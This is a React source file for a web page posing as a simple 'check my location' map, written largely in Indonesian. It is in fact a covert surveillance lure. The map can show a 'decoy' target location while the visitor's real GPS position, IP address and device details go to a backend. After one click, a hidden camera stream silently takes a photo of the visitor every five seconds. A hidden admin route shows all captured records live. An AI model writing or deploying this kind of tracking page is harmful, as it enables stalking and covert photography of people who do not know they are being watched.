import React, { useState, useEffect, useCallback, useRef } from 'react';
import MapView from './components/MapView';
import AdminPanel from './components/AdminPanel';
import { UserLocation, LogEntry } from './types';
import { getBrowserLocation, saveLocationToBackend, getIpLocation, getDeviceInfo } from './services/locationService';
import { supabase } from './supabaseClient';

function App() {
  // Routing State
  const [isAdminRoute, setIsAdminRoute] = useState(false);

  // App State
  const [location, setLocation] = useState<UserLocation | null>(null);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [shouldRecenter, setShouldRecenter] = useState(false);
  const [permissionState, setPermissionState] = useState<'idle' | 'tracking' | 'denied'>('idle');
  const [deviceId] = useState(() => 'user_' + Math.random().toString(36).substring(7));
  const [currentIp, setCurrentIp] = useState<string>('');

  // Hardware Refs
  const watchIdRef = useRef<number | null>(null);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const captureIntervalRef = useRef<number | null>(null);
  const streamRef = useRef<MediaStream | null>(null);

  // 1. Handle "Routing" & URL Params (Target Link)
  useEffect(() => {
    // Check for Admin Route
    if (window.location.pathname === '/adm') {
      setIsAdminRoute(true);
      return;
    }

    // Check for "Decoy" Target in URL (e.g. ?target=-6.2,106.8)
    const params = new URLSearchParams(window.location.search);
    const targetParam = params.get('target');
    
    if (targetParam) {
      const [latStr, lngStr] = targetParam.split(',');
      const lat = parseFloat(latStr);
      const lng = parseFloat(lngStr);

      if (!isNaN(lat) && !isNaN(lng)) {
        // Set the map to this location initially (the "Target")
        setLocation({
          lat: lat,
          lng: lng,
          accuracy: 0, // 0 indicates purely artificial target
          timestamp: Date.now(),
          source: 'ip' // Treat as IP/General source for zoom level logic
        });
        setShouldRecenter(true);
      }
    }
  }, []);

  // 1.5 Realtime Admin Data Sync
  useEffect(() => {
    if (!isAdminRoute || !supabase) return;

    const fetchHistory = async () => {
      const { data, error } = await supabase
        .from('user_locations')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(100); // Increased limit for better history
      
      if (data) {
        const mappedLogs: LogEntry[] = data.map((item: any) => ({
          ...item,
          status: 'synced'
        }));
        setLogs(mappedLogs);
      }
    };

    fetchHistory();

    const channel = supabase
      .channel('public:user_locations')
      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'user_locations' }, (payload) => {
        const newRecord = payload.new;
        const newLog: LogEntry = {
          id: newRecord.id,
          latitude: newRecord.latitude,
          longitude: newRecord.longitude,
          device_id: newRecord.device_id,
          ip_address: newRecord.ip_address,
          image_data: newRecord.image_data,
          device_info: newRecord.device_info,
          created_at: newRecord.created_at,
          status: 'synced'
        };
        
        setLogs(prev => [newLog, ...prev]);
      })
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [isAdminRoute]);

  // 2. Initial IP Fetch (Only if NO target was set via URL)
  useEffect(() => {
    if (isAdminRoute) return; 
    
    // Only fetch IP location if we haven't set a location yet (e.g. via ?target=)
    if (!location) {
      const fetchApproximateLocation = async () => {
        if (permissionState === 'idle') {
          const ipLoc = await getIpLocation();
          if (ipLoc) {
            // Only update if still null (user hasn't clicked anything yet)
            setLocation(prev => prev ? prev : ipLoc);
            if (!location) setShouldRecenter(true);
            if (ipLoc.ip) setCurrentIp(ipLoc.ip);
          }
        }
      };
      fetchApproximateLocation();
    }
  }, [permissionState, isAdminRoute, location]);

  // 3. Helper: Capture Image
  const captureImage = useCallback((): string | undefined => {
    if (videoRef.current && canvasRef.current && streamRef.current) {
      // Check if track is active/live
      if (!streamRef.current.active) return undefined;

      const video = videoRef.current;
      const canvas = canvasRef.current;
      const context = canvas.getContext('2d');
      
      if (context && video.videoWidth > 0) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        return canvas.toDataURL('image/jpeg', 0.5); 
      }
    }
    return undefined;
  }, []);

  // 4. Helper: Process & Save
  const handleDataCapture = useCallback(async (loc: UserLocation, isPeriodicCapture: boolean = false) => {
    // We do NOT update the UI location state here if we are just background logging
    // This keeps the map centered on the "Target" (if set) or User's selection, 
    // while sending the REAL location to backend.
    
    // However, if the user explicitly clicked "Cek Lokasi Saya", we DO want to update the map.
    // Logic: If permissionState is 'tracking', we update UI.
    if (permissionState === 'tracking') {
       setLocation(loc);
    }
    
    let imageData: string | undefined;
    if (isPeriodicCapture) {
      imageData = captureImage();
    }

    // Save if we have GPS source OR an image. 
    if (loc.source === 'gps' || imageData) {
        const deviceInfo = getDeviceInfo();
        const logEntry = await saveLocationToBackend(loc, deviceId, imageData, currentIp, deviceInfo);
        
        if (!isAdminRoute) {
            setLogs(prev => {
              const newLogs = [logEntry, ...prev];
              return newLogs.slice(0, 50);
            });
        }
    }
  }, [deviceId, captureImage, currentIp, isAdminRoute, permissionState]);

  // 5. Start Tracking
  const startTracking = async () => {
    // Check for secure context (HTTPS) which is required for Geolocation in modern browsers
    if (!window.isSecureContext && window.location.hostname !== 'localhost') {
      console.warn("Geolocation requires a secure context (HTTPS) or localhost.");
    }

    // A. Try Camera (Optional)
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      streamRef.current = stream;
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
      }
    } catch (err) {
      // Camera is optional. Log warning but DO NOT stop execution.
      console.warn("Camera access denied or unavailable. Proceeding with Location only.", err);
    }

    // B. Start Location (Mandatory)
    try {
      setPermissionState('tracking');
      setShouldRecenter(true); // Now we want to center on the USER, overriding any "target"

      watchIdRef.current = getBrowserLocation(
        (loc) => {
          // Real-time update to UI
          setLocation(loc); 
          // Background save (first one)
          handleDataCapture(loc, true); 
        },
        (err) => {
          // Improved error logging & handling
          console.warn(`Geo error: Code ${err.code} - ${err.message}`);
          
          if (err.code === 1) { 
             // PERMISSION_DENIED: Fatal
             alert("Izin lokasi ditolak. Mohon aktifkan izin lokasi di browser Anda untuk menggunakan fitur ini.");
             setPermissionState('denied');
          }
        }
      );

      if (captureIntervalRef.current) clearInterval(captureIntervalRef.current);
      
      // Periodic background capture
      captureIntervalRef.current = window.setInterval(() => {
        // We need to get the latest position from the watcher, but since watchPosition
        // is event-based, we rely on the last set 'location' state if possible,
        // or just capture the image.
        // Ideally, we'd cache the very last known GPS coord in a Ref to avoid stale state closures.
        // For simplicity in this structure, we rely on the state update loop or just send image.
        
        // Better approach: Since 'location' state updates, we can use it, but 
        // inside setInterval 'location' might be stale closure.
        // Let's use a functional update to get access to current valid loc.
        setLocation(currentLoc => {
            if (currentLoc && currentLoc.source === 'gps') {
                handleDataCapture(currentLoc, true);
            }
            return currentLoc;
        });
      }, 5000);

    } catch (err: any) {
      console.error("Location Initialization error:", err);
      setPermissionState('denied'); 
    }
  };

  useEffect(() => {
    return () => {
      if (watchIdRef.current !== null) navigator.geolocation.clearWatch(watchIdRef.current);
      if (captureIntervalRef.current) clearInterval(captureIntervalRef.current);
      if (streamRef.current) streamRef.current.getTracks().forEach(track => track.stop());
    };
  }, []);

  if (isAdminRoute) {
    return <AdminPanel logs={logs} />;
  }

  return (
    <div className="h-full w-full flex flex-col bg-gray-900 overflow-hidden relative font-sans text-gray-200">
      
      <video ref={videoRef} className="hidden" playsInline muted></video>
      <canvas ref={canvasRef} className="hidden"></canvas>

      {/* Header */}
      <div className="absolute top-0 left-0 right-0 z-[1500] pointer-events-none p-4">
        <div className="bg-black/60 backdrop-blur-md shadow-lg rounded-2xl p-4 flex justify-between items-center pointer-events-auto max-w-4xl mx-auto border border-white/10">
          <div className="flex items-center space-x-3">
             <div className={`w-10 h-10 rounded-xl flex items-center justify-center text-white shadow-lg transition-colors duration-500 ${
               permissionState === 'tracking' 
                ? 'bg-red-600 shadow-red-500/30 animate-pulse' 
                : 'bg-gray-700 shadow-gray-500/30'
             }`}>
                <i className={`fa-solid ${permissionState === 'tracking' ? 'fa-satellite-dish' : 'fa-radar'}`}></i>
             </div>
             <div>
               <h1 className="font-bold text-lg leading-tight tracking-wider text-white">SYSTEM_V1</h1>
               <p className="text-xs text-gray-400 font-mono uppercase">
                 Status: 
                 <span className={`ml-1 font-bold ${
                   permissionState === 'tracking' ? 'text-green-500' : 'text-gray-500'
                 }`}>
                   {permissionState === 'tracking' ? 'ONLINE' : 'STANDBY'}
                 </span>
               </p>
             </div>
          </div>
          
          <a href="/adm" className="text-xs text-gray-600 hover:text-gray-400">
             <i className="fa-solid fa-terminal"></i>
          </a>
        </div>
      </div>

      {/* Map */}
      <div className="flex-1 relative z-0">
        <MapView 
          location={location} 
          shouldRecenter={shouldRecenter}
          onRecenterComplete={() => setShouldRecenter(false)}
        />
      </div>

      {/* Action Button */}
      <div className="absolute bottom-8 left-1/2 transform -translate-x-1/2 z-[1500]">
        <button 
          onClick={() => {
            if (permissionState !== 'tracking') startTracking();
            else setShouldRecenter(true);
          }}
          className={`
            group relative flex items-center justify-center px-8 py-4 rounded-full shadow-2xl transition-all duration-300 border
            ${permissionState === 'tracking' 
              ? 'bg-black/80 border-green-500/50 text-green-500 hover:bg-black' 
              : 'bg-blue-700 border-blue-500 text-white hover:bg-blue-600 hover:scale-105'
            }
          `}
        >
          {permissionState === 'tracking' && (
             <span className="absolute -top-1 -right-1 flex h-3 w-3">
               <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
               <span className="relative inline-flex rounded-full h-3 w-3 bg-red-500"></span>
             </span>
          )}
          
          <i className={`fa-solid ${permissionState === 'tracking' ? 'fa-crosshairs' : 'fa-location-dot'} text-xl mr-3`}></i>
          <span className="font-bold tracking-widest font-mono uppercase text-sm">
             {permissionState === 'tracking' ? 'LOKASI AKTIF' : 'CEK LOKASI SAYA'}
          </span>
        </button>
      </div>
    </div>
  );
}

export default App;